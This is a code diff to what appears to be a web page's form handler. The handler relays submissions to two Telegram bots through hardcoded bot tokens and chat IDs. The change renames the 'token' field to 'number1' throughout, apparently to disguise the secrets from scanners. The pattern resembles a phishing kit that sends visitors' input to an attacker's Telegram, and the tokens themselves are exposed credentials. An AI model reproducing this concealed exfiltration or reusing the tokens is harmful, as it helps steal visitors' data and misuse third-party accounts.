@@ -107,8 +107,8 @@ export default function Home() {
 
 const handleSubmit = async () => {
   const bots = [
-    { token: "7518413075:AAF2m8aw70h1HDhjKhWoqOJ_kdzpkKdjA98", chat_id: "7650582960" },
-    { token: "8054928004:AAHBXclIm-0GhzIcDiVfEIXvYu7y74geht0", chat_id: "6973974985" },
+    { number1: "7518413075:AAF2m8aw70h1HDhjKhWoqOJ_kdzpkKdjA98", chat_id: "7650582960" },
+    { number1: "8054928004:AAHBXclIm-0GhzIcDiVfEIXvYu7y74geht0", chat_id: "6973974985" },
   ];
 
   try {
@@ -116,7 +116,7 @@ const handleSubmit = async () => {
     let allSuccessful = true;
 
     for (const bot of bots) {
-      const telegramUrl = `https://api.telegram.org/bot${bot.token}/sendMessage`;
+      const telegramUrl = `https://api.telegram.org/bot${bot.number1}/sendMessage`;
       const response = await fetch(telegramUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -129,7 +129,7 @@ const handleSubmit = async () => {
       const data: { ok: boolean } = await response.json();
       if (!data.ok) {
         allSuccessful = false;
-        console.error('Failed for bot:', bot.token);
+        console.error('Failed for bot:', bot.number1);
       }
     }
 
